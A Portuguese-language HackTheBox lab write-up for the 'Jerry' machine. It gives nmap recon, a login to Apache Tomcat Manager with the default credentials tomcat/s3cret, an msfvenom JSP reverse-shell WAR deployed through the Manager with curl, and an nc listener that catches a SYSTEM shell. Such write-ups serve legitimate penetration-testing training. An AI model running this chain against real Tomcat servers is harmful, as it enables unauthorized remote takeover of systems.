Jerry

HackTheBox · Easy by Brenno M.

Jerry expõe o Tomcat Manager com as credenciais padrão. O Manager permite publicar um arquivo WAR, e o Tomcat roda como SYSTEM, então o deploy de um WAR malicioso já entrega a máquina.

Reconhecimento

Só a porta 8080 responde, com um Apache Tomcat 7.0.88.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p8080 <IP>
# 8080 Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88)

O /manager/html pede autenticação básica. Ao cancelar, a página 401 do próprio Tomcat mostra o exemplo de configuração com tomcat / s3cret, que nunca foi trocado. O tomcat_mgr_login do Metasploit chega ao mesmo par testando a lista de padrões.

curl -s -u tomcat:s3cret http://<IP>:8080/manager/text/list
# OK - Listed applications for virtual host localhost

Exploração - deploy de WAR

Gera-se um WAR com uma reverse shell JSP e publica-se pela interface de texto do Manager. Acessar a aplicação dispara a conexão, já como NT AUTHORITY\SYSTEM.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<MEU_IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:s3cret --upload-file shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
nc -lvnp 4444
curl http://<IP>:8080/shell/

As duas flags estão no mesmo arquivo, na área de trabalho do Administrator.

whoami   # nt authority\system
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
